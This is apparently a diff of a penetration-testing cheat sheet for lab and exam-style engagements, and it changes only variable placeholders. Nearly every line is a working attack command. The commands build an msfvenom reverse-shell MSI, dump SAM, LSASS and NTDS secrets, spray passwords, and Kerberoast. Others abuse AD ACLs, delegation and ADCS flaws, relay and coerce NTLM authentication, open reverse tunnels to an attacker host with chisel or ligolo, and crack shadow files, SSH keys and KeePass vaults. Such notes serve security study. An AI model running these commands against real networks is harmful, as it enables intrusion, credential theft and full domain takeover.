 - [ ] **AlwaysInstallElevated** — both keys must be `0x1`; the MSI then runs as SYSTEM.
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST="$ATTACKER" LPORT="$LPORT" -f msi -o rev.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST="<ATTACKER>" LPORT="<LPORT>" -f msi -o rev.msi
 ```
 ```powershell
 msiexec /quiet /qn /i C:\Temp\rev.msi
@@ -626,8 +619,8 @@ reg save hklm\sam C:\Temp\sam; reg save hklm\system C:\Temp\system; reg save hkl
 ```bash
 pypykatz lsa minidump lsass.dmp
 impacket-secretsdump -sam sam -system system -security security LOCAL
-nxc smb "$IP" -u "$USER" -p "$PASS" --sam --lsa
-nxc smb "$DC" -u "$USER" -p "$PASS" --ntds
+nxc smb "<IP>" -u "<USER>" -p "<PASS>" --sam --lsa
+nxc smb "<DC>" -u "<USER>" -p "<PASS>" --ntds
 ```
 
 - [ ] **AV / AppLocker / language mode, then one automated sweep** — know what will eat your payload.
@@ -644,46 +637,46 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 Sync the clock before every Kerberos step: `KRB_AP_ERR_SKEW` is a time problem, not a credential problem.
 
 ```bash
-sudo ntpdate "$DC"          # or: sudo rdate -n "$DC"; the VPN may drop, reconnect
+sudo ntpdate "<DC>"          # or: sudo rdate -n "<DC>"; the VPN may drop, reconnect
 ```
 
 - [ ] **Unauthenticated enumeration** — null/guest SMB, RPC, RID brute, kerbrute.
 ```bash
-nxc smb "$DC" -u '' -p '' --shares
-nxc smb "$DC" -u guest -p '' --shares --rid-brute
-rpcclient -U "" -N "$DC" -c "enumdomusers;enumdomgroups;querydispinfo"
-kerbrute userenum -d "$DOMAIN" --dc "$DC" "$USERS" -o valid_users.txt
+nxc smb "<DC>" -u '' -p '' --shares
+nxc smb "<DC>" -u guest -p '' --shares --rid-brute
+rpcclient -U "" -N "<DC>" -c "enumdomusers;enumdomgroups;querydispinfo"
+kerbrute userenum -d "<DOMAIN>" --dc "<DC>" "<USERS>" -o valid_users.txt
 sort -u valid_users.txt -o valid_users.txt
 ```
 
 - [ ] **Credential validation and spraying** — policy first, one password per pass, `--continue-on-success`.
 ```bash
-nxc smb "$DC" -u '' -p '' --pass-pol
-nxc smb "$DC" -u valid_users.txt -p "$PASS" --continue-on-success
-nxc ldap "$DC" -u "$USER" -p "$PASS" --continue-on-success
-nxc winrm "$IP" -u "$USER" -p "$PASS"
+nxc smb "<DC>" -u '' -p '' --pass-pol
+nxc smb "<DC>" -u valid_users.txt -p "<PASS>" --continue-on-success
+nxc ldap "<DC>" -u "<USER>" -p "<PASS>" --continue-on-success
+nxc winrm "<IP>" -u "<USER>" -p "<PASS>"
 ```
 
 - [ ] **BloodHound** — collect once you hold any account, then read the edges.
 ```bash
-bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
-# CE builds: bloodhound-ce-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
-# Kerberos/ccache: bloodhound-python -k --use-kcache -d "$DOMAIN" -ns "$DC" -c All --zip
+bloodhound-python -d "<DOMAIN>" -u "<USER>" -p "<PASS>" -ns "<DC>" -c All --zip
+# CE builds: bloodhound-ce-python -d "<DOMAIN>" -u "<USER>" -p "<PASS>" -ns "<DC>" -c All --zip
+# Kerberos/ccache: bloodhound-python -k --use-kcache -d "<DOMAIN>" -ns "<DC>" -c All --zip
 ```
 
 - [ ] **Kerberoast and AS-REP** — RC4 first; AES needs the right mode.
 ```bash
-impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile tgs.txt
-impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request-user <svc> -outputfile tgs.txt
-impacket-GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -no-pass -dc-ip "$DC" -format hashcat -outputfile asrep.txt
-hashcat -m 13100 tgs.txt "$WORDLIST"; hashcat -m 18200 asrep.txt "$WORDLIST"
+impacket-GetUserSPNs "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>" -request -outputfile tgs.txt
+impacket-GetUserSPNs "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>" -request-user <svc> -outputfile tgs.txt
+impacket-GetNPUsers "<DOMAIN>/" -usersfile valid_users.txt -no-pass -dc-ip "<DC>" -format hashcat -outputfile asrep.txt
+hashcat -m 13100 tgs.txt "<WORDLIST>"; hashcat -m 18200 asrep.txt "<WORDLIST>"
 ```
 
 - [ ] **Kerberos ticket handling** — ccache and kirbi interchange; the file you get from `getST` must be exported before use.
 ```bash
-impacket-getTGT "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
-export KRB5CCNAME=$USER.ccache
-impacket-getST -spn cifs/<target> -impersonate administrator "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
+impacket-getTGT "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
+export KRB5CCNAME=<USER>.ccache
+impacket-getST -spn cifs/<target> -impersonate administrator "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
 impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=ticket.ccache
 klist
@@ -691,46 +684,46 @@ klist
 
 - [ ] **ACL abuse** — identify with BloodHound, then use the matching primitive.
 ```bash
-impacket-owneredit -action write -new-owner "$USER" -target <group> "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
-impacket-dacledit -action write -rights WriteMembers -principal "$USER" -target <group> "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
-net rpc group addmem "<group>" "$USER" -U "$DOMAIN/$USER%$PASS" -S "$DC"
-net rpc password "<target-user>" 'NewPass123!' -U "$DOMAIN/$USER%$PASS" -S "$DC"
-bloodyAD --host "$DC" -d "$DOMAIN" -u "$USER" -p "$PASS" add groupMember "<group>" "$USER"
-bloodyAD --host "$DC" -d "$DOMAIN" -u "$USER" -p "$PASS" set owner "<target>" "$USER"
-impacket-dacledit -action write -rights DCSync -principal "$USER" -target-dn "DC=<domain>,DC=<tld>" "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
-targetedKerberoast.py -d "$DOMAIN" -u "$USER" -p "$PASS" -v
+impacket-owneredit -action write -new-owner "<USER>" -target <group> "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
+impacket-dacledit -action write -rights WriteMembers -principal "<USER>" -target <group> "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
+net rpc group addmem "<group>" "<USER>" -U "<DOMAIN>/<USER>%<PASS>" -S "<DC>"
+net rpc password "<target-user>" 'NewPass123!' -U "<DOMAIN>/<USER>%<PASS>" -S "<DC>"
+bloodyAD --host "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASS>" add groupMember "<group>" "<USER>"
+bloodyAD --host "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASS>" set owner "<target>" "<USER>"
+impacket-dacledit -action write -rights DCSync -principal "<USER>" -target-dn "DC=<domain>,DC=<tld>" "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
+targetedKerberoast.py -d "<DOMAIN>" -u "<USER>" -p "<PASS>" -v
 ```
 
 - [ ] **Shadow credentials** — needs write on the target object.
 ```bash
-certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account <target> -dc-ip "$DC"
-pywhisker.py -d "$DOMAIN" -u "$USER" -p "$PASS" --target <target> --action add
+certipy shadow auto -u "<USER>@<DOMAIN>" -p "<PASS>" -account <target> -dc-ip "<DC>"
+pywhisker.py -d "<DOMAIN>" -u "<USER>" -p "<PASS>" --target <target> --action add
 ```
 
 - [ ] **Delegation (unconstrained / constrained / RBCD)** — write on the target is enough for RBCD.
 ```bash
-impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
-impacket-getST -spn cifs/<target-fqdn> -impersonate administrator "$DOMAIN/<svc>:$PASS" -dc-ip "$DC"
+impacket-findDelegation "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
+impacket-getST -spn cifs/<target-fqdn> -impersonate administrator "<DOMAIN>/<svc>:<PASS>" -dc-ip "<DC>"
 export KRB5CCNAME=administrator.ccache; impacket-secretsdump -k -no-pass <target-fqdn>
-impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'ATTACK$' -computer-pass 'Pass123!' -dc-ip "$DC"
-impacket-rbcd -delegate-from 'ATTACK$' -delegate-to '<TARGET$>' -action write -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
-impacket-getST -spn cifs/<target-fqdn> -impersonate administrator -dc-ip "$DC" "$DOMAIN/ATTACK$:Pass123!"
+impacket-addcomputer "<DOMAIN>/<USER>:<PASS>" -computer-name 'ATTACK$' -computer-pass 'Pass123!' -dc-ip "<DC>"
+impacket-rbcd -delegate-from 'ATTACK$' -delegate-to '<TARGET$>' -action write -dc-ip "<DC>" "<DOMAIN>/<USER>:<PASS>"
+impacket-getST -spn cifs/<target-fqdn> -impersonate administrator -dc-ip "<DC>" "<DOMAIN>/ATTACK$:Pass123!"
 ```
 
 - [ ] **ADCS** — run `find` as every new user; findings are permission-dependent. 2026 extends to ESC17 (Server Auth SAN) and the CA-level Certighost (CVE-2026-54121).
 ```bash
-certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
-certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template <TEMPLATE> -upn "administrator@$DOMAIN" -dc-ip "$DC"
-certipy auth -pfx administrator.pfx -dc-ip "$DC"
-certipy template -u "$USER@$DOMAIN" -p "$PASS" -template <TEMPLATE> -write-default-configuration -save-old -dc-ip "$DC"
-certipy template -u "$USER@$DOMAIN" -p "$PASS" -template <TEMPLATE> -configuration <TEMPLATE>.json -dc-ip "$DC"
-certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template WebServer -upn "administrator@$DOMAIN" -application-policies 'Client Authentication' -dc-ip "$DC"   # ESC15
-certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template DomainController -dc-ip "$DC"                                                             # Certighost (CVE-2026-54121), unpatched CA
+certipy find -u "<USER>@<DOMAIN>" -p "<PASS>" -dc-ip "<DC>" -vulnerable -stdout
+certipy req -u "<USER>@<DOMAIN>" -p "<PASS>" -ca <CA-NAME> -template <TEMPLATE> -upn "administrator@<DOMAIN>" -dc-ip "<DC>"
+certipy auth -pfx administrator.pfx -dc-ip "<DC>"
+certipy template -u "<USER>@<DOMAIN>" -p "<PASS>" -template <TEMPLATE> -write-default-configuration -save-old -dc-ip "<DC>"
+certipy template -u "<USER>@<DOMAIN>" -p "<PASS>" -template <TEMPLATE> -configuration <TEMPLATE>.json -dc-ip "<DC>"
+certipy req -u "<USER>@<DOMAIN>" -p "<PASS>" -ca <CA-NAME> -template WebServer -upn "administrator@<DOMAIN>" -application-policies 'Client Authentication' -dc-ip "<DC>"   # ESC15
+certipy req -u "<USER>@<DOMAIN>" -p "<PASS>" -ca <CA-NAME> -template DomainController -dc-ip "<DC>"                                                             # Certighost (CVE-2026-54121), unpatched CA
 ```
 
 - [ ] **MSSQL as a pivot** — auth backend matters: `--local-auth` vs domain, `-windows-auth`.
 ```bash
-impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
+impacket-mssqlclient "<DOMAIN>/<USER>:<PASS>@<IP>" -windows-auth
 ```
 ```powershell
 SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
@@ -747,17 +740,17 @@ nxc smb <cidr> --gen-relay-list relay.txt
 sudo responder -I tun0 -wv
 impacket-ntlmrelayx -tf relay.txt -smb2support
 impacket-ntlmrelayx -t "http://<CA-HOST>/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController
-impacket-ntlmrelayx -t ldaps://"$DC" -smb2support --delegate-access --remove-mic
-python3 PetitPotam.py "$ATTACKER" "$DC"
-impacket-printerbug "$DOMAIN/$USER:$PASS@$DC" "$ATTACKER"
-python3 dfscoerce.py -u "$USER" -p "$PASS" "$ATTACKER" "$DC"
+impacket-ntlmrelayx -t ldaps://"<DC>" -smb2support --delegate-access --remove-mic
+python3 PetitPotam.py "<ATTACKER>" "<DC>"
+impacket-printerbug "<DOMAIN>/<USER>:<PASS>@<DC>" "<ATTACKER>"
+python3 dfscoerce.py -u "<USER>" -p "<PASS>" "<ATTACKER>" "<DC>"
 ```
 
 - [ ] **DCSync / domain dominance** — one clean dump, then stop.
 ```bash
-impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC" -just-dc -outputfile dcsync
-impacket-secretsdump -k -no-pass "$DC" -just-dc
-nxc smb "$DC" -u "$USER" -p "$PASS" --ntds
+impacket-secretsdump "<DOMAIN>/<USER>:<PASS>@<DC>" -just-dc -outputfile dcsync
+impacket-secretsdump -k -no-pass "<DC>" -just-dc
+nxc smb "<DC>" -u "<USER>" -p "<PASS>" --ntds
 ```
 
 - [ ] **Trusts** — direction, transitivity and SID filtering decide whether ExtraSids works.
@@ -769,19 +762,19 @@ impacket-GetUserSPNs "<other-domain>/<user>:<pass>" -dc-ip "<other-dc>" -request
 - [ ] **2025–2026 high-value CVEs to check first** — each is a single-credential path to SYSTEM/DA on unpatched environments.
 ```bash
 # NoPac (CVE-2021-42278/42287) — any standard user, MachineAccountQuota > 0
-nxc smb "$DC" -u "$USER" -p "$PASS" -M nopac
+nxc smb "<DC>" -u "<USER>" -p "<PASS>" -M nopac
 
 # PrintNightmare (CVE-2021-1675/34527) — spooler running
-rpcdump.py @"$IP" 2>/dev/null | egrep 'MS-RPRN|MS-PAR'
+rpcdump.py @"<IP>" 2>/dev/null | egrep 'MS-RPRN|MS-PAR'
 
 # ResetNightmare (CVE-2026-27912) — any user resets any password via kpasswd
 # ResetNightmare.ps1 + Rubeus; check patch level: pre-March 2026 is vulnerable
 
 # Certighost (CVE-2026-54121) — standard user → DC certificate → DCSync
-certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -i certighost
+certipy find -u "<USER>@<DOMAIN>" -p "<PASS>" -dc-ip "<DC>" -stdout | grep -i certighost
 
 # NTLM reflection (CVE-2025-33073) — any user → SYSTEM on hosts without signing
-nmap -p445 --script smb2-security-mode "$IP"   # "signing enabled but not required" → exploitable
+nmap -p445 --script smb2-security-mode "<IP>"   # "signing enabled but not required" → exploitable
 ```
 
 ## 7. Cracking & credential handling
@@ -812,39 +805,39 @@ AES Kerberoast mode numbers move between hashcat releases — confirm with `hash
 
 - [ ] **Baseline crack** — wordlist, then rules, then masks; stop at the timebox, not at 100%.
 ```bash
-hashcat -m <mode> hashes.txt "$WORDLIST" -O -w 3
-hashcat -m <mode> hashes.txt "$WORDLIST" -r /usr/share/hashcat/rules/best64.rule
+hashcat -m <mode> hashes.txt "<WORDLIST>" -O -w 3
+hashcat -m <mode> hashes.txt "<WORDLIST>" -r /usr/share/hashcat/rules/best64.rule
 hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
 hashcat -m <mode> hashes.txt --show
 ```
 
 - [ ] **Slow modes** — cap the time; one bcrypt hash must not eat the box.
 ```bash
-hashcat -m 3200 hashes.txt "$WORDLIST" --user
-john --format=bcrypt --wordlist="$WORDLIST" hashes.txt
+hashcat -m 3200 hashes.txt "<WORDLIST>" --user
+john --format=bcrypt --wordlist="<WORDLIST>" hashes.txt
 ```
 
 - [ ] **John for files and formats** — `*2john` converts, then the same wordlist.
 ```bash
-unshadow /etc/passwd /etc/shadow > unshadowed.hashes && john --wordlist="$WORDLIST" unshadowed.hashes
-ssh2john id_rsa > id_rsa.hash && john --wordlist="$WORDLIST" id_rsa.hash
-zip2john loot.zip > zip.hash && john --wordlist="$WORDLIST" zip.hash
-keepass2john vault.kdbx > keepass.hash && john --wordlist="$WORDLIST" keepass.hash
-john --rules --wordlist="$WORDLIST" hashes.txt
+unshadow /etc/passwd /etc/shadow > unshadowed.hashes && john --wordlist="<WORDLIST>" unshadowed.hashes
+ssh2john id_rsa > id_rsa.hash && john --wordlist="<WORDLIST>" id_rsa.hash
+zip2john loot.zip > zip.hash && john --wordlist="<WORDLIST>" zip.hash
+keepass2john vault.kdbx > keepass.hash && john --wordlist="<WORDLIST>" keepass.hash
+john --rules --wordlist="<WORDLIST>" hashes.txt
 ```
 
 - [ ] **Wordlist mutation** — build from the target's own words when rockyou is not enough.
 ```bash
-cewl "http://$DOMAIN" -d 4 -m 6 --lowercase -w cewl.txt
+cewl "http://<DOMAIN>" -d 4 -m 6 --lowercase -w cewl.txt
 hashcat --force cewl.txt -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.txt
 ```
 
 - [ ] **Spraying** — one password per pass, respect the lockout counter.
 ```bash
-nxc smb "$DC" -u users.txt -p 'Spring2026!' --continue-on-success
-kerbrute passwordspray -d "$DOMAIN" --dc "$DC" users.txt 'Spring2026!'
-hydra -L users.txt -P passwords.txt -u -f ssh://"$IP" -t 4
-crowbar -b rdp -s "$IP"/32 -U users.txt -c 'Spring2026!'
+nxc smb "<DC>" -u users.txt -p 'Spring2026!' --continue-on-success
+kerbrute passwordspray -d "<DOMAIN>" --dc "<DC>" users.txt 'Spring2026!'
+hydra -L users.txt -P passwords.txt -u -f ssh://"<IP>" -t 4
+crowbar -b rdp -s "<IP>"/32 -U users.txt -c 'Spring2026!'
 ```
 
 - [ ] **Not hashes** — do not send these to hashcat.
@@ -857,10 +850,10 @@ python3 cisco_de7.py <type7-blob>  # Cisco type 7: reversible XOR
 
 - [ ] **SSH tunnels** — `-L` local, `-R` reverse, `-D` SOCKS; the most stable option when SSH exists.
 ```bash
-ssh -L 8080:127.0.0.1:80 "$USER@$IP" -N -f
-ssh -L 8080:127.0.0.1:80 -L 3306:127.0.0.1:3306 "$USER@$IP" -N
-ssh -R 8080:127.0.0.1:80 "$USER@$IP" -N -f   # target:8080 -> your 127.0.0.1:80
-ssh -D 1080 "$USER@$IP" -N -f
+ssh -L 8080:127.0.0.1:80 "<USER>@<IP>" -N -f
+ssh -L 8080:127.0.0.1:80 -L 3306:127.0.0.1:3306 "<USER>@<IP>" -N
+ssh -R 8080:127.0.0.1:80 "<USER>@<IP>" -N -f   # target:8080 -> your 127.0.0.1:80
+ssh -D 1080 "<USER>@<IP>" -N -f
 ```
 
 - [ ] **Chisel** — one binary, works from Windows and Linux.
@@ -868,8 +861,8 @@ ssh -D 1080 "$USER@$IP" -N -f
 # Linux
 ./chisel server -p 8000 --reverse
 # target
-./chisel client "$ATTACKER":8000 R:socks
-./chisel client "$ATTACKER":8000 R:8888:127.0.0.1:8888
+./chisel client "<ATTACKER>":8000 R:socks
+./chisel client "<ATTACKER>":8000 R:8888:127.0.0.1:8888
 ```
 
 - [ ] **ligolo-ng** — full network stack; needs a TUN interface on the attacker host.
@@ -877,7 +870,7 @@ ssh -D 1080 "$USER@$IP" -N -f
 sudo ip tuntap add user "$(whoami)" mode tun ligolo && sudo ip link set ligolo up
 ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601   # older builds: ./proxy
 # target
-./ligolo-agent -connect "$ATTACKER":11601 -ignore-cert   # older builds: ./agent
+./ligolo-agent -connect "<ATTACKER>":11601 -ignore-cert   # older builds: ./agent
 # proxy console
 session
 ifconfig
@@ -888,15 +881,15 @@ start
 - [ ] **proxychains** — TCP only; scanners need `-sT -Pn`, and UDP will not work.
 ```bash
 # /etc/proxychains4.conf -> [ProxyList] -> socks5 127.0.0.1 1080
-proxychains4 -q nmap -sT -Pn -p80,445,3389 "$IP"
-proxychains4 -q nxc smb "$IP" -u "$USER" -p "$PASS"
-proxychains4 -q evil-winrm -i "$IP" -u "$USER" -p "$PASS"
+proxychains4 -q nmap -sT -Pn -p80,445,3389 "<IP>"
+proxychains4 -q nxc smb "<IP>" -u "<USER>" -p "<PASS>"
+proxychains4 -q evil-winrm -i "<IP>" -u "<USER>" -p "<PASS>"
 ```
 
 - [ ] **socat** — a one-off forward or a relay on the pivot host.
 ```bash
 socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80
-socat TCP4-LISTEN:4444,fork TCP4:"$ATTACKER":4444
+socat TCP4-LISTEN:4444,fork TCP4:"<ATTACKER>":4444
 ```
 
 - [ ] **Windows netsh** — native portproxy, admin required.
@@ -930,12 +923,12 @@ dir C:\Users\<user>\.ssh
 ```bash
 impacket-smbserver loot /tmp/loot -smb2support
 python3 -m uploadserver 8000
-curl -s -o loot.zip "http://$IP/loot.zip"
+curl -s -o loot.zip "http://<IP>/loot.zip"
 ```
 
 - [ ] **Evidence and hashes** — every finding gets a file, a timestamp and a checksum.
 ```bash
-date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/$IP.md"
+date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/<IP>.md"
 import -window root "engagement/evidence/F-01_$(date +%Y%m%d_%H%M)_root.png"
 sha256sum loot/* >> engagement/evidence/hashes.txt
 ```
@@ -962,7 +955,7 @@ find / -mmin -180 -type f 2>/dev/null | head -50 > engagement/post-activity.txt
 | ------- | ------------ | ---- |
 | Top-1000 scan empty or all filtered | `nmap -sS -p- --min-rate 5000` plus UDP 161 | [Information Gathering](/notes/web-applications/information-gathering/) |
 | 403 on a directory | Treat as existing: `/.git/`, `.bak`, `OPTIONS`, trailing slash | [Fuzzing](/notes/web-applications/fuzzing/) |
-| IP root looks like a decoy | `ffuf -H "Host: FUZZ.$DOMAIN" -ac`; read the TLS SAN | [Fuzzing](/notes/web-applications/fuzzing/) |
+| IP root looks like a decoy | `ffuf -H "Host: FUZZ.<DOMAIN>" -ac`; read the TLS SAN | [Fuzzing](/notes/web-applications/fuzzing/) |
 | `.git` or a backup exposed | `git-dumper`, `git log -p`, `git diff --cached`, grep configs | [Linux machines](/notes/oscp-labs/linux/) |
 | Login form, unknown product | Product defaults → `nxc` spray → type juggling / `' or 1=1-- -` | [Password Attacks](/notes/utilities-scripts-and-payloads/password-attacks/) |
 | Upload accepted but not executed | `.php.png`, `.htaccess`/`web.config`, magic bytes, `phar://` | [File Uploads](/notes/web-applications/web-attacks/file-uploads/) |
@@ -979,7 +972,7 @@ find / -mmin -180 -type f 2>/dev/null | head -50 > engagement/post-activity.txt
 | `whoami /priv` shows SeImpersonate | GodPotato / PrintSpoofer, then `whoami` as SYSTEM | [Token abuse](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) |
 | Writable service binary or path | Replace, restart, expect 1053 or a failed start | [Services](/notes/windows-privilege-escalation/unquoted-service-paths/) |
 | Service bound to 127.0.0.1 | `ssh -L`, chisel or ligolo, then re-enumerate | [Pivoting](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) |
-| `KRB_AP_ERR_SKEW` | `sudo ntpdate "$DC"`, reconnect VPN, retry | [Kerberos delegation](/notes/active-directory/kerberos-delegation/) |
+| `KRB_AP_ERR_SKEW` | `sudo ntpdate "<DC>"`, reconnect VPN, retry | [Kerberos delegation](/notes/active-directory/kerberos-delegation/) |
 | `certipy find` shows ESC1/ESC4/ESC8/ESC15/ESC17 | Request with `-upn` or `-application-policies`; restore the template; relay to HTTP enrollment | [ADCS](/notes/active-directory/adcs-attacks/) |
 | BloodHound path ends in DCSync rights | `secretsdump -just-dc`, one dump, then proof | [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) |
 | Two domains or a trust | Check direction and SID filtering, then cross-forest Kerberoast | [Domain trusts](/notes/active-directory/domain-trusts/) |
@@ -1049,28 +1042,28 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 
 ```bash
 # 01 — clock first, or Kerberos fails
-sudo ntpdate "$DC"
+sudo ntpdate "<DC>"
 # 02 — validate the credential on each service
-nxc smb "$DC" -u "$USER" -p "$PASS"
-nxc ldap "$DC" -u "$USER" -p "$PASS" --users --groups
-nxc winrm "$IP" -u "$USER" -p "$PASS"
+nxc smb "<DC>" -u "<USER>" -p "<PASS>"
+nxc ldap "<DC>" -u "<USER>" -p "<PASS>" --users --groups
+nxc winrm "<IP>" -u "<USER>" -p "<PASS>"
 # 03 — BloodHound
-bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
+bloodhound-python -d "<DOMAIN>" -u "<USER>" -p "<PASS>" -ns "<DC>" -c All --zip
 # 04 — SPN roast and AS-REP roast
-impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile tgs.txt
-impacket-GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -no-pass -dc-ip "$DC" -format hashcat -outputfile asrep.txt
+impacket-GetUserSPNs "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>" -request -outputfile tgs.txt
+impacket-GetNPUsers "<DOMAIN>/" -usersfile valid_users.txt -no-pass -dc-ip "<DC>" -format hashcat -outputfile asrep.txt
 # 05 — ACL paths, delegation, and ADCS — permission-dependent, so re-check as each new user
-certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
-impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
+certipy find -u "<USER>@<DOMAIN>" -p "<PASS>" -dc-ip "<DC>" -vulnerable -stdout
+impacket-findDelegation "<DOMAIN>/<USER>:<PASS>" -dc-ip "<DC>"
 # 06 — open relay surface
 nxc smb <cidr> --gen-relay-list relay.txt
-nmap -p445 --script smb2-security-mode "$IP"
+nmap -p445 --script smb2-security-mode "<IP>"
 # 07 — coercion primitives to try
-python3 PetitPotam.py "$ATTACKER" "$DC"
-impacket-printerbug "$DOMAIN/$USER:$PASS@$DC" "$ATTACKER"
+python3 PetitPotam.py "<ATTACKER>" "<DC>"
+impacket-printerbug "<DOMAIN>/<USER>:<PASS>@<DC>" "<ATTACKER>"
 # 08 — high-value 2025–2026 CVEs to check the patch level for
-nxc smb "$DC" -u "$USER" -p "$PASS" -M nopac           # NoPac
-certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -iE 'ESC1|ESC15|ESC17|Certighost'
+nxc smb "<DC>" -u "<USER>" -p "<PASS>" -M nopac           # NoPac
+certipy find -u "<USER>@<DOMAIN>" -p "<PASS>" -dc-ip "<DC>" -stdout | grep -iE 'ESC1|ESC15|ESC17|Certighost'
 ```
 
 Next: turn the results into a hypothesis and use the [methodology](/notes/oscp-labs/methodology/) decision table. Worked examples of every technique on this page are in [Linux machines](/notes/oscp-labs/linux/), [Windows machines](/notes/oscp-labs/windows/) and [Active Directory machines](/notes/oscp-labs/ad/).
